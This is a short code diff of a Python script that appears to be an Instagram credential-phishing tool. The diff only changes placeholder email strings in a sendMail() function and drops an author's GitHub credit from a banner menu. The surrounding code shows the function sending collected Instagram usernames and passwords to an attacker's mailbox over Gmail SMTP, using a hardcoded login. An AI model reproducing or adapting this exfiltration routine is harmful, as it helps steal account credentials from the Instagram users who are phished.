@@ -100,13 +100,13 @@ def sendMail():
 	global InstagramUser
 	global InstagramPassword
 
-	defaultMail = "enter your email address"
-	defaultPassword = "enter your email password"  
+	defaultMail = "youremail"
+	defaultPassword = "emailpassword"  
 
 	mail = MIMEText(total,"html","utf-8")
 	mail["From"] = defaultMail
 	mail["Subject"] = defaultPassword
-	mail["To"] ="".join("enter your email address")  
+	mail["To"] ="".join("email")  
 	mail = mail.as_string(total)
 	try:
 		server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -115,7 +115,7 @@ def sendMail():
 		server.ehlo()
 		server.login(defaultMail, defaultPassword)
 
-		server.sendmail(defaultMail, "enter your email address", mail)
+		server.sendmail(defaultMail, "email", mail)
 
 		time.sleep(3)
 		server.quit()
@@ -208,7 +208,7 @@ print("""
 		[2] İnstall
 
 				created by oğulcan KAÇAR
-				github: github.com/ogulcankacarr
+				
 
 		""")
 
